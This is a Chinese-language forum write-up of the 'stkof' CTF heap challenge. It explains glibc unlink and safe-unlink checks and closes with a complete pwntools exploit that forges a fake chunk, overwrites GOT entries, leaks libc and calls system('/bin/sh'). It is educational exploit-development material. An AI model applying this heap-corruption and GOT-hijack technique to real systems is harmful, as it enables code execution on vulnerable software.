[font=黑体][b]基础知识[/b][/font]
[font=黑体]首先就是unlink的认识了，在libc版本中曾经出现过安全机制不强的版本，其大致逻辑如下,其中fd，bk分别是forward，backward的缩写，我学的时候老分叉，但是知道原本单词是啥就没事了，所以我个人建议也是缩写尽量知道原译比较好。[/font];www
[mw_shl_code=c,true]void unlink(ptr * p){
    FD =  p->fd;
    BK  = p->bk;
    FD->bk = p->bk;
    BK->fd = p->fd;
}[/mw_shl_code]
而用图来描述呢，大致就是如下图（由于我想自己更加深理解，所以没用网图，各位可能看着吃力点，这个红线就是unlink时连接的）
[attachimg]2550013[/attachimg]
[attachimg]2550014[/attachimg]
至于为什么要有unlink以及unlink的时机嘛，我也时一知半解，因为我刚学完fastbin，一些largebin、smallbin、tcache等机制我还没接触，所以不是很清楚，就本题我自己查阅的资料加上自己的见解来说，
unlink就是为了防止堆内存空间的碎块过多，而其中unlink也并不就是说真把上面那个p块拿走了，而是说他合并了，这点我最开始很不理解，就是ctfwiki上面讲的拿出来，我寻思拿出来了再怎么利用呢，还有ctfwiki上面对于unlink的时机我觉得没则么说清楚，我自己上网查阅资料得出再free掉一个块的时候会首先查看自身的prev_size位是否为0，如果为0的话那么就说明上一块时空闲的，这时如果free掉当前快的话，那么就会对你自身free块的上一个空闲块进行unlink，然后这两个块就顺势合并，所以说并没有真的把哪一块弄下来了，当然我只知道free函数调用的时候会判断unlink，其他有没有用这个操作我就不太了解了（这也留作之后的学习罢）。以下我分享一下free时调用unlink函数的源码的一部分，大家有兴趣看堆的源码我推荐一个师傅的文章，那可真叫一个细[quote]glibc中malloc源码分析
[url=https://www.52pojie.cn/thread-1581911-1-1.html]https://www.52pojie.cn/thread-1581911-1-1.html[/url]
(出处: 吾爱破解论坛)[/quote]
[mw_shl_code=asm,true]        if (!prev_inuse(p)) {            prevsize = p->prev_size;
            size += prevsize;
            p = chunk_at_offset(p, -((long ) prevsize));
            unlink(av, p, bck, fwd);
        }[/mw_shl_code]
而对于unlink的利用也很容易理解，既然我要unlink这个p块，那我在他的fd以及bk上填上我自身想填的地址值就行阿，涉及到这里，我就还是画图（图画的不好见谅）
[attachimg]2550022[/attachimg]
知道以上俗称unsafe unlink之后，再了解了解目前更为常见的safe unlink罢（悲），根据其名字就知道这个肯定有安全点的意思了，看他的源码会发现他在unlink之前检查了free块的prev_size与前面块的size位是否相等，之后还是看代码分析
[mw_shl_code=c,true]#define unlink(AV, P, BK, FD) { 
//判断chunk p的大小，是否与下一个chunk 的prev_size相等
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) 
      malloc_printerr ("corrupted size vs. prev_size"); 
    //让FD指向p的下一个chunk，BK指向p的上一个chunk
    FD = P->fd; 
    BK = P->bk; 
    //以上是，chunk的大小在small bin范围内的断链操作
    //以下是，large bin，的断链操作，首先判断FD的bk，与BK的fd是否同时指向p
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0)) 
      malloc_printerr ("corrupted double-linked list"); 
    else { 
        //首先进行初步断链，使FD的bk指向BK的fd，BK的fd指向FD，只是堆fd,bk的断链操作
        FD->bk = BK; 
        BK->fd = FD; 
        //以下使堆bk_nextsize,fd_nextsize的断链操作（large bin有两个双向链表，fd，bk用来
        //进行FIFO操作，bk_nextsize,fd_nextsize是根据堆块的大小进行排序的链表）
        //以下第一个if判断p的chunk是否在small范围内
        if (!in_smallbin_range (chunksize_nomask (P)) 
            && __builtin_expect (P->fd_nextsize != NULL, 0)) { 
            //判断chunk p的下一个chunk的上一个节点，以及上一个chunk的下一个节点是不是p
        if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) 
        || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0)) 
          malloc_printerr ("corrupted double-linked list (not small)"); 
          //以下是luoarge bin的断链操作，首先判断chunk p的下下一个chunk的fd_nextsize是否为空
            if (FD->fd_nextsize == NULL) { 
            //p的下下一个chunk的fd_nextsize为空
                if (P->fd_nextsize == P) 
                //判断是否只有一个chunk p,是则如下
                  FD->fd_nextsize = FD->bk_nextsize = FD; 
                else { 
                //不是以下操作，四个指针，正常的双向链表的断链操作
                    FD->fd_nextsize = P->fd_nextsize; 
                    FD->bk_nextsize = P->bk_nextsize; 
                    P->fd_nextsize->bk_nextsize = FD; 
                    P->bk_nextsize->fd_nextsize = FD; 
                  } 
              } else { 
              //p的下下一个chunk的fd_nextsize不为空，直接断链
                P->fd_nextsize->bk_nextsize = P->bk_nextsize; 
                P->bk_nextsize->fd_nextsize = P->fd_nextsize; 
              } 
          } 
      } 
}[/mw_shl_code]
也就是说我们在unsafe unlink的构造不管用了，在以前的unlink中我们可以这样构造，就比如unlink下一块的Q中，如果我们将Q中的bk项换位我们任意想给的项的话，那我们就会被这项给难住，因为我们target_addr !=p
[mw_shl_code=asm,true]if (__builtin_expect (FD->bk != P || BK->fd != P, 0))malloc_printerr ("corrupted double-linked list"); [/mw_shl_code]
所以我们就想怎么绕过呢，最开始我也硬是没反应过来时怎么绕的，之后发现是自己对指针的理解不够透彻，以下是我的个人理解，也就是当我们unlink的时候，Q->bk指向p的必要条件是Q->bk这个指针的值必须等于p这个指针（也就是P chunk块的块指针）的值，那我们如何在内存中找个伪造的相同的值呢，我只能说很少，几乎不可能存在，这时不如我们运用辩证法中矛盾的统一性与对立性在事物发展过程中起作用的原理（考研的同学记得回答一下这个原理的方法论）{:301_1008:}，此时我们就想到找同样的p值那不如我们就找这个p指针算了，而此时我们的target_addr就要保证target_addr = p，而在正常情况下，我们Q的bk指针只是内容与P指针一样，但是我们绕过就是利用的恰恰就是将bk改为p，接下来我们进入正题来讨论此题，这样更有助于我们来学习。
[b]题目分析[/b]
依然是照旧安全性检查
[attachimg]2550024[/attachimg]
发现got表可写，canary、栈不可执行（因为直接是学习用的简单堆题，直接掠过:keai），没开pie，狂喜，哥们最喜欢不乱动的了
执行下看看，这题是真离谱，给个提示行不行，自己看是真的累，第二张图就是执行过程大伙看了可以评价评价那几个数字纯我手打
[attachimg]2550026[/attachimg][attachimg]2550027[/attachimg]

程序大致逻辑就是1分配你自己决定大小的块，2就是编辑块里面的数据，3是啥功能都没实现，我最开始以为是show，4是删除块，分别看每个函数发现allocation中由于没开pie，所以bss段时固定的，而其中也发现我们分配chunk后，有一个bss段上的数据段来保存这个块地址，注意这个块地址是chunk中fd那片区域的地址，而不是整个块的首地址，而这个数组是从下标1开始保存的
[attachimg]2550029[/attachimg]
之后查看edit函数，发现其中逻辑是我们先录入一个我们即将输入的大小，然后再输入字符串，并且他这也没检查，很明显的漏洞了。
[attachimg]2550030[/attachimg]
之后阿delete的函数很正常就不必展示了，我们首先分配几个块来看看内存布局，再ida中可看到bss段地址
[attachimg]2550032[/attachimg][attachimg]2550033[/attachimg][attachimg]2550034[/attachimg]

此时发现bss段上都存着chunk中fd的地址，而这个bss段上又是可执行的，并且没开pie，所以说我们固定的知道chunk的地址，这样我们就立即采用unlink来进行漏洞利用，上图可以看到每个我们分配的堆地址都在上面了，大家注意我这个bss地址与ida中不一样是因为我ida没在虚拟机上面开，因为我linux的ida不知道出什么问题突然打不开了，我们再来看看此时的堆分布
[attachimg]2550046[/attachimg]
此时大家肯定有很多疑问，这楼主再说甚么啊，这写的都是些上面玩意，别慌大伙，我一个一个讲，首先我为什么要最开始分配一个小块呢，因为通过调试你会得知在分配第一个块后，他会立即因为没有关闭setbuf，而printf函数就会默认创建一个巨大的块来作为缓冲区，存放你曾经输入的字符，所以我在代码注释上面也注释了第一块其实没什么用，但是为什么之后的块我也一并分配0x80呢（十进制128），因为fastbin大小限制在那里了，80的块刚好限制了当他free的时候不会将他放入fastbin，而是丢入unsortbin，然后才能unlink，这也是因为fastbin中inuse是一直为1的。
之后就开始进行漏洞利用，此时我们已经分配了5个块，此时我们利用edit函数讲块2溢出到块3，使得其inuse位为0，并且适当调节prev_size，使得以假乱真
[attachimg]2550054[/attachimg]
具体的代码中注释也说的很清楚了，至于我们发送的其他字节，我将画图来讲述
也就是说我们在0x91的块中构造了一个fake_chunk，此时我们的块3就会将其当作一个真正的空闲块进行unlink，此时我们还要精心布局其中的fd以及bk，要保证fd+0x18,以及bk+0x10要等于p，而p在bss段上的地址已经是固定的了，所以我们很容易就能算出来fd与bk应填入的地址（也就是p-0x18,p-0x10），而这个构造最终会导致的结果就是p = p - 0x18,通过调试可以直观的看出来
[attachimg]2550056[/attachimg]
接下来就简单了，我们可以通过edit来改写块2的内容，所以此时我们修改S数组中第0个块和第1个块的地址为free以及puts的got表地址，当我们修改块0和块1时就相当于修改了got表的内容，于是我们先将块0的got表修改为puts的plt地址，这时当我们free一个块时，他就会执行puts而不是free，我们此时free块1,此时实际执行的是puts（puts_got）,这样就造成了puts的地址泄露，之后我们再将free改为system地址，然后修改一个块内容为‘/bin/sh’之后free掉即可获取shell啦。
[attachimg]2550057[/attachimg]
成功！
[b]总结[/b]
写这个题的时候大部分是在查别的资料，这个题本来漏洞利用很简单，但是要搞清楚利用的原理还是需要多思考思考的，还有一处最开始也给我懵了，由于我没改libc版本，导致我unlink一直不成功，之后才发现是因为tcache版本是在glibc-2.26出现的，而最开始我用的本机的版本2.33，之后了解后改为本题的libc才成公，也就是libc-2.23，还有就是这kali可能真不适合pwn了，我换了个版本gdb的指令就一大部分用不了了，有师傅也建议我用ubuntu。
之后附上exp
[mw_shl_code=python,true]from pwn import *
io = process('./stkof')
context.log_level = 'info'
elf = ELF('./stkof')
libc = ELF('./libc-2.23.so')
free_got = elf.got['free']
puts_got = elf.got['puts']
free_plt = elf.plt['free']
puts_plt = elf.plt['puts']
bss_addr = 0x602100
chunk_addr = 0x602140

def add(size):                  #添加块函数
    io.recvuntil('OK\n')
    io.sendline('1')
    io.sendline(str(size))


def edit(num,size,payload):     #其中num为下标，size为想要修改的字数，payload即为揣测
    io.recvuntil('OK\n')
    io.sendline('2')
    io.sendline(str(num))
    io.sendline(str(size))
    io.send(payload)

def delet(num):
    io.recvuntil('OK\n')
    io.sendline('3')
    io.sendline(str(num))

io.sendline('1')
io.sendline('24')               #由于第一个块后衔接printf的buf所以对本题利用价值不大
add(128)                        #块A，下标为2
add(128)                        #块B，3
add(128)                        #块C，4
add(128)                        #块D，5

#unlink

#修改B块的prev_inuse位为0
#unlink操作：
#   FD = this->fd
#   BK = this->bk
#   FD->bk = this->bk
#   BK->fd = this->fd

aim = chunk_addr + 0x10         #下标为0,1不用

pl1 = p64(0)+ p64(0x81) + p64(aim-0x18) + p64(aim-0x10) + b'a'*0x60 + p64(0x80) + b'\x90'         #此时发送0x89个字节，刚好覆盖块B的prev_inuse 位以及大小
edit(2,len(pl1),pl1)                 #修改块A,此时将B块的prev_size与size位均修改为0x90

#此时块B认为A块为空闲块，当freeB块时将会对其进行合并，也就是对块A进行unlink
delet(3)

#此时可以修改bss段上的内容了
pl2 = b'a'*8 + p64(free_got) + p64(puts_got)    #此时修改s[0]s[1]分别为free和puts的got表地址

edit(2,len(pl2),pl2)

#然后修改块0的内容，也就是修改了free中got的内容为puts_plt，这样当我们free时就掉用的时puts
pl3 = p64(puts_plt)
edit(0,len(pl3),pl3)        #此时的效果即为puts(puts_got)
delet(1)
puts_addr = u64(io.recv(6).ljust(8,b'\x00'))
io.success('puts_addr==>'+hex(puts_addr))

puts_libc = libc.sym['puts']
system_libc = libc.sym['system']
libc_base = puts_addr - puts_libc
system_addr = libc_base + system_libc

io.success('libc_base==>'+hex(libc_base))
io.success('system_address==>'+ hex(system_addr))



#此时再修改块0,使得块0的free_got指向system地址其指向system
pl4 =p64(system_addr)
edit(0,len(pl4),pl4)

#最后填充块2的值，使得其字符串为/bin/sh,执行free_hook
pl5 = '/bin/sh' + '\x00'
edit(2,len(pl5),pl5)

delet(2)
io.interactive()
[/mw_shl_code]
